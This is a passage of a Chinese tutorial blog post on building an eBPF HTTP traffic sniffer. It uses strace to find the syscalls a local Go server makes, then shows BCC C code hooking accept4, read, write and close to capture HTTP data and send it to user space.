GOPROXY="https://goproxy.cn"</span><br><span class="line">go mod init xx</span><br><span class="line">go mod tidy</span><br></pre></td></tr></table></figure><p>下载完成后运行server服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/eBPF-Sniffer# go run server.go</span><br><span class="line">[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.</span><br><span class="line"> - using env:export GIN_MODE=release</span><br><span class="line"> - using code:gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /customResponse           --&gt; main.postCustomResponse (2 handlers)</span><br><span class="line">listening on 0.0.0.0:8080</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span><br><span class="line">[GIN-debug] Listening and serving HTTP on 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>本地发送POST请求，服务器接收到POST请求后会响应随机生成的Payload。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan# curl -X POST http://localhost:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"Gs#UjI7u2kiOmSyJDkw7JAi3Y~Z4fauPaeThxct14qoweIUdiwDsB#9PUuvPgayVGfXQcc$E9itK1tlo5twE$cuGRvge4S~H2cS6"&#125;</span><br></pre></td></tr></table></figure><p>如果我们需要通过eBPF去捕获完整的HTTP请求，第一步需要了解到本次请求使用了哪些系统调用，因此我们可以使用<code>strace</code>工具进行查看。</p><p>通过如下命令运行server服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -f -o syscalls_dump.txt go run server.go</span><br></pre></td></tr></table></figure><ul><li><code>-f</code>：从服务器的线程中捕获系统调用</li><li><code>-o</code>：将结果写入到文件中</li></ul><p>接着再次运行上述POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan# curl -X POST http://localhost:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"Gs#UjI7u2kiOmSyJDkw7JAi3Y~Z4fauPaeThxct14qoweIUdiwDsB#9PUuvPgayVGfXQcc$E9itK1tlo5twE$cuGRvge4S~H2cS6"&#125;</span><br></pre></td></tr></table></figure><p>查看<code>syscalls_dump.txt</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2507558 accept4(3,  &lt;unfinished ...&gt;</span><br><span class="line">2507562 epoll_pwait(4,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 &lt;... accept4 resumed&gt; 0xc00031fa28, [112], SOCK_CLOEXEC|SOCK_NONBLOCK) = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">2507562 &lt;... epoll_pwait resumed&gt; [&#123;EPOLLIN|EPOLLOUT, &#123;u32=3021211368, u64=140633135384296&#125;&#125;], 128, 0, NULL, 0) = 1</span><br><span class="line">2507562 epoll_pwait(4,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 read(7, "POST /customResponse HTTP/1.1\r\nH"..., 4096) = 175</span><br><span class="line">2507558 write(7, "HTTP/1.1 200 OK\r\nContent-Type: a"..., 237 &lt;unfinished ...&gt;</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;, NULL) = 0</span><br><span class="line">2507558 futex(0xc000080148, FUTEX_WAKE_PRIVATE, 1 &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 &lt;... futex resumed&gt; )           = 1</span><br><span class="line">2507561 &lt;... futex resumed&gt; )           = 0</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507561 nanosleep(&#123;tv_sec=0, tv_nsec=3000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507561 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">....</span><br><span class="line">2507558 close(7 &lt;unfinished ...&gt;</span><br></pre></td></tr></table></figure><p>通过上述文件可以看到。服务器首先使用<code>accept4</code>系统调用来接受一个新的连接。整个请求服务器的调用流程如下：</p><ul><li><code>accept4</code>：使用系统调用接受新连接</li><li><code>read</code>：使用套接字文件描述符(fd)上的系统调用从套接字读取内容</li><li><code>write</code>：使用套接字文件描述符(fd)上的系统调用将响应写入套接字</li><li><code>close</code>：使用系统调用关闭文件描述符</li></ul><h4 id="内核代理eBPF实现"><a href="#内核代理eBPF实现" class="headerlink" title="内核代理eBPF实现"></a>内核代理eBPF实现</h4><p>我们需要通过eBPF hook 8个钩子，分别是<code>accept4、read、write、close</code>的进入和退出钩子。程序通过C语言编写，我们会通过所有的钩子组合来执行完整的捕获过程。</p><p>在大多数情况下，eBPF程序由执行hook的内核代理和处理从内核发送的事件的用户代理组成。在一些其他用例中，可能只有内核代理（如阻止恶意流量的防火墙）</p><p>首先我们需要挂载<code>accept4</code>系统调用。在eBPF程序中，我们可以在每个系统调用的进入和退出放置钩子。这对于获取系统调用的输入参数很有用。</p><p>在如下代码片段中，我们声明结构体以将系统调用的输入参数保存在系统调用的入口中，并在<code>accept4</code>系统调用的出口处使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存系统调用的addr参数结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>* <span class="title">addr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// map映射，在入口和返回钩子之间缓存接受系统调用的输入参数</span></span><br><span class="line">BPF_HASH(active_accept_args_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">accept_args_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hooking the entry of accept4</span></span><br><span class="line"><span class="comment">// the signature of the syscall is int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_entry_accept4</span><span class="params">(struct pt_regs* ctx, <span class="keyword">int</span> sockfd, struct sockaddr* addr, <span class="keyword">socklen_t</span>* addrlen)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取相关pid中线程唯一id，这样可以链接同一线程的不同调用。</span></span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将addr保存在map中，方便accept4退出时使用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span> <span class="title">accept_args</span> = &#123;</span>&#125;;</span><br><span class="line">    accept_args.addr = (struct sockaddr_in *)addr;</span><br><span class="line">    active_accept_args_map.update(&amp;id, &amp;accept_args);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hooking the exit of accept4</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_ret_accept4</span><span class="params">(struct pt_regs* ctx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从map中获取addr</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span>* <span class="title">accept_args</span> = <span class="title">active_accept_args_map</span>.<span class="title">lookup</span>(&amp;<span class="title">id</span>);</span></span><br><span class="line">    <span class="comment">// 如果map映射中存在 id，我们将获得一个非空指针，该指针保存来自系统调用条目的输入地址参数。</span></span><br><span class="line">    <span class="keyword">if</span> (accept_args != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        process_syscall_accept(ctx, id, accept_args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后清理map</span></span><br><span class="line">    active_accept_args_map.<span class="keyword">delete</span>(&amp;id);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在系统调用进入期间我们无法知道系统调用是否会成功，并且在系统调用退出期间我们无法访问输入参数，因此我们需要存储参数。这里我们使用的逻辑是<code>process_syscall_accept</code>，该函数会检查系统调用是否成功完成，然后我们会将链接信息保存在全局map中，以便后续的系统调用(read、write、close)使用。</p><p>在下面的代码中，我们创建了<code>accept4</code>hook使用的函数。并在我们自己的map映射中注册到服务器上的任何新的连接。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个结构体，表示由 pid、fd和结构体timestamp组成的唯一ID。</span></span><br><span class="line"><span class="comment">// descriptor and the creation time of the struct.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pid;</span><br><span class="line">    <span class="comment">// 打开的网络连接的fd</span></span><br><span class="line">    <span class="keyword">int32_t</span> fd;</span><br><span class="line">    <span class="comment">// 结构体初始化时的时间戳</span></span><br><span class="line">    <span class="keyword">uint64_t</span> tsid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该结构包含建立连接时通过accept4() 系统调用收集的信息。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 连接标识符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在此连接上写入/读取的字节数</span></span><br><span class="line">    <span class="keyword">int64_t</span> wr_bytes;</span><br><span class="line">    <span class="keyword">int64_t</span> rd_bytes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指示我们将连接识别为HTTP的标志</span></span><br><span class="line">    <span class="keyword">bool</span> is_http;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送到用户代理的事件结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_open_event_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 事件发生的事件</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line">    <span class="comment">// 连接的唯一ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line">    <span class="comment">// 客户端地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 活动连接的映射。map名字是conn_info_map</span></span><br><span class="line">BPF_HASH(conn_info_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">conn_info_t</span>, <span class="number">131072</span>);</span><br><span class="line"><span class="comment">// 一个性能缓冲区，允许我们将事件从内核发送到用户模式</span></span><br><span class="line"><span class="comment">// 该性能缓冲区专用于特殊类型的事件-打开事件</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_open_events);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查系统调用是否成功完成以及是否将新连接保存在专用连接映射中的帮助函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __inline <span class="keyword">void</span> <span class="title">process_syscall_accept</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id, <span class="keyword">const</span> struct <span class="keyword">accept_args_t</span>* args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 提取返回码，检查是否失败，如果是，直接终止。</span></span><br><span class="line">    <span class="keyword">int</span> ret_fd = PT_REGS_RC(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ret_fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span> <span class="title">conn_info</span> = &#123;</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    conn_info.conn_id.pid = pid;</span><br><span class="line">    conn_info.conn_id.fd = ret_fd;</span><br><span class="line">    conn_info.conn_id.tsid = bpf_ktime_get_ns();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)ret_fd;</span><br><span class="line">    <span class="comment">// 将连接信息保存在全局map中，因此在其他系统调用（read、write和close）中，我们将能够知道已经看到了连接</span></span><br><span class="line">    conn_info_map.update(&amp;pid_fd, &amp;conn_info);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向用户模式发送一个打开事件，让用户模式知道我们已经识别了一个新的连接。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket_open_event_t</span> <span class="title">open_event</span> = &#123;</span>&#125;;</span><br><span class="line">    open_event.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">    open_event.conn_id = conn_info.conn_id;</span><br><span class="line">bpf_probe_read(&amp;open_event.addr, <span class="keyword">sizeof</span>(open_event.addr), args-&gt;addr);</span><br><span class="line"></span><br><span class="line">    socket_open_events.perf_submit(ctx, &amp;open_event, <span class="keyword">sizeof</span>(struct <span class="keyword">socket_open_event_t</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，我们能够在内核侧识别新的连接并将信息发送至用户代理。接下来，我们将hook read系统调用</p><p>在下面的代码中，我们将hook read系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个辅助结构，用于缓存入口钩子和出口钩子之间读/写系统调用的输入参数。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> fd;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// map 存储入口和出口挂钩之间的读取系统调用参数。</span></span><br><span class="line">BPF_HASH(active_read_args_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">data_args_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// original signature: ssize_t read(int fd, void *buf, size_t count);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_entry_read</span><span class="params">(struct pt_regs* ctx, <span class="keyword">int</span> fd, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储参数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span> <span class="title">read_args</span> = &#123;</span>&#125;;</span><br><span class="line">    read_args.fd = fd;</span><br><span class="line">    read_args.buf = buf;</span><br><span class="line">    active_read_args_map.update(&amp;id, &amp;read_args);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_ret_read</span><span class="params">(struct pt_regs* ctx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 系统调用的返回码也是读取的字节数。</span></span><br><span class="line">    <span class="keyword">ssize_t</span> bytes_count = PT_REGS_RC(ctx); </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span>* <span class="title">read_args</span> = <span class="title">active_read_args_map</span>.<span class="title">lookup</span>(&amp;<span class="title">id</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (read_args != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// kIngress 是一个枚举值，让 process_data函数知道输入缓冲区是传入还是传出。</span></span><br><span class="line">        process_data(ctx, id, kIngress, read_args, bytes_count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后清理map</span></span><br><span class="line">    active_read_args_map.<span class="keyword">delete</span>(&amp;id);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，我们创建了辅助函数来处理<code>read</code>和<code>write</code>系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据缓冲区消息大小，BPF最多可以将这个数量的数据提交到perf缓冲区。</span></span><br><span class="line"><span class="comment">//内核大小限制为32kb</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MSG_SIZE 30720  <span class="comment">// 30KiB</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_data_event_t</span> &#123;</span></span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">attr_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 系统调用完成时的时间戳</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接标识符 (PID, FD, etc.).</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// msg 字段编码的实际数据的类型，调用者使用它来确定如何解释数据。</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="keyword">traffic_direction_t</span> direction;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原始消息的大小。我们使用它来截断 msg 字段以最小化正在传输的数据量。</span></span><br><span class="line">    <span class="keyword">uint32_t</span> msg_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接上此事件的从 0 开始的位置编号，以字节位置表示。</span></span><br><span class="line">    <span class="comment">// 该位置是该消息的第一个字节。</span></span><br><span class="line">    <span class="keyword">uint64_t</span> pos;</span><br><span class="line">  &#125; attr;</span><br><span class="line">  <span class="keyword">char</span> msg[MAX_MSG_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perf缓冲区向用户模式代理发送数据事件</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_data_events);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理读/写系统调用的辅助函数</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> __attribute__((__always_inline__)) <span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                   <span class="keyword">enum</span> <span class="keyword">traffic_direction_t</span> direction,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                   <span class="keyword">const</span> struct <span class="keyword">data_args_t</span>* args, <span class="keyword">ssize_t</span> bytes_count)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在访问指针之前始终检查对指针的访问</span></span><br><span class="line">    <span class="keyword">if</span> (args-&gt;buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于 read 和 write 系统调用，返回码是写入或读取的字节数，因此零表示没有写入或读取任何内容，负数表示系统调用失败。</span></span><br><span class="line">    <span class="keyword">if</span> (bytes_count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)args-&gt;fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span>* <span class="title">conn_info</span> = <span class="title">conn_info_map</span>.<span class="title">lookup</span>(&amp;<span class="title">pid_fd</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (conn_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 正在读/写的fd不代表IPV4套接字fd</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查连接是否已经是HTTP或者检查是否是新连接，如果是HTTP，则返回true</span></span><br><span class="line">    <span class="keyword">if</span> (is_http_connection(conn_info, args-&gt;buf, bytes_count)) &#123;</span><br><span class="line">        <span class="comment">// 分配新事件</span></span><br><span class="line">        <span class="keyword">uint32_t</span> kZero = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket_data_event_t</span>* <span class="title">event</span> = <span class="title">socket_data_event_buffer_heap</span>.<span class="title">lookup</span>(&amp;<span class="title">kZero</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (event == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 填充数据事件的元数据</span></span><br><span class="line">        event-&gt;attr.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">        event-&gt;attr.direction = direction;</span><br><span class="line">        event-&gt;attr.conn_id = conn_info-&gt;conn_id;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 另一个辅助函数，如果给定缓冲区大小，则将其拆分为块</span></span><br><span class="line">        perf_submit_wrapper(ctx, direction, args-&gt;buf, bytes_count, conn_info, event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新conn_info总写入/读取的字节数</span></span><br><span class="line"><span class="keyword">switch</span> (direction) &#123;</span><br><span class="line">        <span class="keyword">case</span> kEgress:</span><br><span class="line">            conn_info-&gt;wr_bytes += bytes_count;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> kIngress:</span><br><span class="line">            conn_info-&gt;rd_bytes += bytes_count;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可以看到，我们的辅助函数会检查<code>read</code>或者<code>write</code>系统调用是否成功完成。通过检查 读取（写入）字节，检查正在读取（或写入）的数据是否为HTTP。如果是，则发送它到用户模式代理并作为一个事件。</p><p>然后会快速转到write系统调用。</p><p>最后代码处理close事件。在下面的代码中，我们创建了辅助函数来处理close系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 